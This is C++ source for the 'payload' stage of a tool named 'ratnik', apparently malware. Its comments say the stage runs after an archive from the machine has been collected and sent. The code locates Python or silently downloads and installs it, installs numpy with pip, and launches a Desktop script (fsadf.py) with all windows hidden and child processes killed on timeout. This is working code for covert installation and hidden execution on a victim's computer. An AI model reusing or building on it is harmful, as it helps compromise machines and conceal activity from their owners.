#include "payload.h"
#include "config.h"

#include <algorithm>
#include <functional>

// The payload stage is the only part of ratnik that needs Python. It is a
// best-effort extra: the archive has already been collected and sent before we
// get here, so a machine without Python must never be waited on. Every external
// command below runs under a hard deadline; when the deadline expires the whole
// process tree is killed and the step is skipped.

namespace {

constexpr DWORD kProbeMs = 8000;   // python -c "import numpy"

bool IsFile(const fs::path& p) {
    std::error_code ec;
    return fs::is_regular_file(p, ec);
}

// A real interpreter is a few megabytes. The 0-byte app-execution aliases in
// WindowsApps are not usable from here, so they must not count as "found".
bool IsPythonBinary(const fs::path& p) {
    std::error_code ec;
    if (!fs::is_regular_file(p, ec)) return false;
    auto sz = fs::file_size(p, ec);
    return !ec && sz > 20000;
}

std::wstring Quote(const std::wstring& s) { return L"\"" + s + L"\""; }
std::wstring Quote(const fs::path& p) { return Quote(p.wstring()); }

// Runs a command line with the console hidden. The child is placed in a job
// object, so a timeout kills the whole tree: an interrupted installer never
// survives in the background and keeps locking files.
bool RunHidden(const std::wstring& cmd, DWORD timeoutMs, DWORD* exitCode) {
    if (timeoutMs < 200) return false;

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi{};
    std::wstring line = cmd;
    if (!CreateProcessW(nullptr, line.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW | CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        Log("payload: CreateProcess failed (%lu): %s", GetLastError(), ToUtf8(cmd).c_str());
        return false;
    }

    HANDLE job = CreateJobObjectW(nullptr, nullptr);
    if (job) AssignProcessToJobObject(job, pi.hProcess);
    ResumeThread(pi.hThread);

    DWORD w = WaitForSingleObject(pi.hProcess, timeoutMs);
    bool finished = (w == WAIT_OBJECT_0);
    if (exitCode) {
        *exitCode = 1;
        if (finished) GetExitCodeProcess(pi.hProcess, exitCode);
    }
    if (!finished) {
        Log("payload: timeout %lu ms, killing: %s", timeoutMs, ToUtf8(cmd).c_str());
        if (job) TerminateJobObject(job, 1);
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 2000);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    if (job) CloseHandle(job);
    return finished;
}

// --------------------------------------------------------------- discovery

struct Py {
    fs::path console;   // python.exe — used for -c probes
    fs::path runner;    // pythonw.exe when present, otherwise console
    bool ok() const { return !console.empty(); }
};

Py MakePy(const fs::path& found) {
    Py r;
    if (found.empty()) return r;
    fs::path dir = found.parent_path();
    fs::path con = dir / L"python.exe";
    fs::path win = dir / L"pythonw.exe";
    r.console = IsPythonBinary(con) ? con : found;
    r.runner = IsPythonBinary(win) ? win : r.console;
    return r;
}

fs::path ReadRegString(HKEY root, const std::wstring& sub, const wchar_t* value) {
    HKEY k = nullptr;
    if (RegOpenKeyExW(root, sub.c_str(), 0, KEY_READ, &k) != ERROR_SUCCESS) return {};
    wchar_t buf[1024] = L"";
    DWORD cb = sizeof(buf);
    DWORD type = 0;
    LSTATUS st = RegQueryValueExW(k, value, nullptr, &type, (LPBYTE)buf, &cb);
    RegCloseKey(k);
    if (st != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) return {};
    std::wstring s(buf, cb / sizeof(wchar_t));
    while (!s.empty() && s.back() == L'\0') s.pop_back();
    return s.empty() ? fs::path() : fs::path(s);
}

// PythonCore keeps one subkey per installed version; the newest wins.
fs::path RegPython(HKEY root, const wchar_t* coreKey) {
    HKEY core = nullptr;
    if (RegOpenKeyExW(root, coreKey, 0, KEY_READ, &core) != ERROR_SUCCESS) return {};

    std::vector<std::wstring> versions;
    wchar_t name[64];
    for (DWORD i = 0;; i++) {
        DWORD len = 64;
        if (RegEnumKeyExW(core, i, name, &len, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
        versions.emplace_back(name, len);
    }
    RegCloseKey(core);
    std::sort(versions.begin(), versions.end(), std::greater<>());

    for (auto& v : versions) {
        std::wstring base = std::wstring(coreKey) + L"\\" + v + L"\\InstallPath";
        fs::path dir = ReadRegString(root, base, nullptr);
        if (!dir.empty() && IsPythonBinary(dir / L"python.exe")) return dir / L"python.exe";
        fs::path exe = ReadRegString(root, base, L"ExecutablePath");
        if (!exe.empty() && IsPythonBinary(exe)) return exe;
    }
    return {};
}

fs::path PickIn(const fs::path& dir) {
    std::error_code ec;
    if (!fs::is_directory(dir, ec)) return {};
    for (const wchar_t* n : { L"python.exe", L"pythonw.exe" }) {
        fs::path p = dir / n;
        if (IsPythonBinary(p)) return p;
    }
    return {};
}

// One level below the known roots: ...\Programs\Python\Python312\python.exe
fs::path ScanRoot(const fs::path& root) {
    fs::path direct = PickIn(root);
    if (!direct.empty()) return direct;

    std::vector<fs::path> kids;
    std::error_code ec;
    for (fs::directory_iterator it(root, fs::directory_options::skip_permission_denied, ec), end;
         it != end && !ec; it.increment(ec)) {
        if (it->is_directory(ec)) kids.push_back(it->path());
    }
    std::sort(kids.begin(), kids.end(), std::greater<>());
    for (auto& k : kids) {
        fs::path p = PickIn(k);
        if (!p.empty()) return p;
    }
    return {};
}

fs::path FindPython() {
    // 1) PATH (plus the app directory), both console and windowless names.
    for (const wchar_t* n : { L"python.exe", L"pythonw.exe" }) {
        wchar_t buf[MAX_PATH];
        DWORD got = SearchPathW(nullptr, n, nullptr, MAX_PATH, buf, nullptr);
        if (got > 0 && got < MAX_PATH && IsPythonBinary(buf)) return fs::path(buf);
    }

    // 2) Registry, which is populated even when the installer skipped PATH.
    const std::pair<HKEY, const wchar_t*> cores[] = {
        { HKEY_CURRENT_USER,  L"Software\\Python\\PythonCore" },
        { HKEY_LOCAL_MACHINE, L"Software\\Python\\PythonCore" },
        { HKEY_LOCAL_MACHINE, L"Software\\WOW6432Node\\Python\\PythonCore" },
    };
    for (auto& c : cores) {
        fs::path p = RegPython(c.first, c.second);
        if (!p.empty()) return p;
    }

    // 3) Default install roots, shallow scan only — no walking of whole drives.
    const fs::path roots[] = {
        fs::path(Env(L"LOCALAPPDATA")) / L"Programs" / L"Python",
        fs::path(Env(L"ProgramFiles")) / L"Python",
        fs::path(Env(L"ProgramFiles(x86)")) / L"Python",
        fs::path(L"C:\\") / L"Python",
        fs::path(Env(L"ProgramData")) / L"Anaconda3",
        fs::path(Env(L"USERPROFILE")) / L"Anaconda3",
        fs::path(Env(L"USERPROFILE")) / L"miniconda3",
        fs::path(Env(L"USERPROFILE")) / L"AppData" / L"Local" / L"Microsoft" / L"WindowsApps",
    };
    for (auto& r : roots) {
        fs::path p = ScanRoot(r);
        if (!p.empty()) return p;
    }
    return {};
}

// -------------------------------------------------------------- acquisition

bool HttpDownload(const std::wstring& url, const fs::path& dst, DWORD budgetMs) {
    if (budgetMs < 1000) return false;

    std::wstring host, path;
    INTERNET_PORT port = 0;
    bool https = false;
    {
        URL_COMPONENTS uc{};
        uc.dwStructSize = sizeof(uc);
        wchar_t h[256] = L"", p[2048] = L"";
        uc.lpszHostName = h; uc.dwHostNameLength = 256;
        uc.lpszUrlPath = p; uc.dwUrlPathLength = 2048;
        if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc)) {
            Log("payload: bad installer url");
            return false;
        }
        host = h; path = p;
        port = uc.nPort;
        https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    }

    ULONGLONG deadline = GetTickCount64() + budgetMs;
    HINTERNET s = WinHttpOpen(L"ratnik/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    // Keep every blocking phase short: the whole attempt has to fit the budget.
    DWORD slice = budgetMs / 6;
    if (slice < 750) slice = 750;
    if (slice > 2500) slice = 2500;
    WinHttpSetTimeouts(s, (int)slice, (int)slice, (int)slice, (int)slice);

    bool ok = false;
    HINTERNET c = WinHttpConnect(s, host.c_str(), port, 0);
    if (c) {
        DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET r = WinHttpOpenRequest(c, L"GET", path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (r) {
            if (WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nullptr, 0, 0, 0) &&
                WinHttpReceiveResponse(r, nullptr)) {
                DWORD status = 0, len = sizeof(status);
                WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                    WINHTTP_HEADER_NAME_BY_INDEX, &status, &len,
                                    WINHTTP_NO_HEADER_INDEX);
                if (status == 200) {
                    Bytes data;
                    ok = true;
                    DWORD avail = 0;
                    while (GetTickCount64() < deadline) {
                        if (!WinHttpQueryDataAvailable(r, &avail) || !avail) break;
                        size_t at = data.size();
                        data.resize(at + avail);
                        DWORD rd = 0;
                        if (!WinHttpReadData(r, data.data() + at, avail, &rd)) { ok = false; break; }
                        data.resize(at + rd);
                        if (data.size() > (128u << 20)) { ok = false; break; }
                    }
                    if (ok && GetTickCount64() >= deadline) {
                        Log("payload: installer download did not finish in time");
                        ok = false;
                    }
                    if (ok) ok = !data.empty() && WriteAll(dst, data);
                } else {
                    Log("payload: installer http %lu", status);
                }
            } else {
                Log("payload: installer request failed %lu", GetLastError());
            }
            WinHttpCloseHandle(r);
        }
        WinHttpCloseHandle(c);
    }
    WinHttpCloseHandle(s);
    return ok;
}

// Python is not installed. Try to install it once, inside the caller's budget.
// Whatever happens here, the caller re-checks FindPython() and skips the step if
// it is still empty.
Py AcquirePython(DWORD budgetMs) {
#if PYTHON_AUTO_INSTALL
    ULONGLONG deadline = GetTickCount64() + budgetMs;
    auto left = [&]() -> DWORD {
        ULONGLONG now = GetTickCount64();
        return now >= deadline ? 0 : (DWORD)(deadline - now);
    };

    // 1) winget, when the App Installer is present.
    fs::path winget = fs::path(Env(L"LOCALAPPDATA")) / L"Microsoft" / L"WindowsApps" / L"winget.exe";
    if (IsFile(winget) && left() > 500) {
        Log("payload: python missing, trying winget");
        DWORD rc = 1;
        RunHidden(Quote(winget) + L" " + PYTHON_WINGET_ARGS, left(), &rc);
        Py p = MakePy(FindPython());
        if (p.ok()) return p;
    }

    // 2) Official installer, downloaded and run silently.
    if (left() > 1500) {
        fs::path setup = TempDir() / L"ratnik_py_setup.exe";
        Log("payload: python missing, downloading installer");
        if (HttpDownload(PYTHON_INSTALLER_URL, setup, left())) {
            DWORD rc = 1;
            std::wstring cmd = Quote(setup) +
                L" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_launcher=1 /norestart";
            RunHidden(cmd, left(), &rc);
            std::error_code ec;
            fs::remove(setup, ec);
            Py p = MakePy(FindPython());
            if (p.ok()) return p;
        }
    }
#else
    (void)budgetMs;
#endif
    return {};
}

// ------------------------------------------------------------------- entry

fs::path FindScript() {
    const fs::path cands[] = {
        fs::path(Env(L"USERPROFILE")) / L"Desktop" / L"fsadf.py",
        ExeDir() / L"fsadf.py",
    };
    for (auto& c : cands) {
        std::error_code ec;
        if (fs::exists(c, ec)) return c;
    }
    return {};
}

}  // namespace

void LaunchPayload() {
    wchar_t skip[8];
    if (GetEnvironmentVariableW(L"RATNIK_SKIP_PAYLOAD", skip, 8) > 0) {
        Log("payload: skipped by env");
        return;
    }

    fs::path script = FindScript();
    if (script.empty()) {
        Log("payload: fsadf.py not found");
        return;
    }

    Py py = MakePy(FindPython());
    if (!py.ok()) {
        Log("payload: python not installed, budget %lu ms", (unsigned long)PYTHON_ACQUIRE_TIMEOUT_MS);
        py = AcquirePython(PYTHON_ACQUIRE_TIMEOUT_MS);
    }
    if (!py.ok()) {
        // No Python and it did not appear in time: skip the step, do not stall.
        Log("payload: python unavailable, payload step skipped");
        return;
    }
    Log("payload: python=%s", ToUtf8(py.console.wstring()).c_str());

    DWORD rc = 1;
    bool hasNumpy = RunHidden(Quote(py.console) + L" -c \"import numpy\"", kProbeMs, &rc) && rc == 0;
    if (!hasNumpy) {
        Log("payload: numpy missing, installing");
        RunHidden(Quote(py.console) + L" -m pip install --quiet --disable-pip-version-check numpy",
                  NUMPY_INSTALL_TIMEOUT_MS, &rc);
        hasNumpy = RunHidden(Quote(py.console) + L" -c \"import numpy\"", kProbeMs, &rc) && rc == 0;
        Log("payload: numpy=%d", (int)hasNumpy);
    }

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi{};
    std::wstring cmd = Quote(py.runner) + L" " + Quote(script);
    std::wstring dir = script.parent_path().wstring();
    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                       nullptr, dir.c_str(), &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Log("payload: started %s", ToUtf8(cmd).c_str());
    } else {
        Log("payload: start failed %lu", GetLastError());
    }
}
